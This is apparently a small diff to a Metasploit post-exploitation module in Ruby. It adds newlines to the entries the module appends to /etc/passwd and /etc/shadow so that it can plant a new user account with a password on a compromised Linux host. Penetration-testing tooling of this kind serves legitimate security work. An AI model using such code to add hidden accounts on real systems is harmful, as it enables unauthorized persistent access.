@@ -254,9 +254,9 @@ class MetasploitModule < Msf::Post
       # Run adding user manually if set
       home = datastore['HOME'].empty? ? "/home/#{datastore['USERNAME']}" : datastore['HOME']
       uid = rand(1000..2000).to_s
-      append_file('/etc/passwd', "#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}")
+      append_file('/etc/passwd', "#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\n")
       vprint_status("\'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd")
-      append_file('/etc/shadow', "#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::")
+      append_file('/etc/shadow', "#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\n")
       vprint_status("\'#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\' >> /etc/shadow")
 
       altered_group_file = fs_add_groups(group_file, groups)
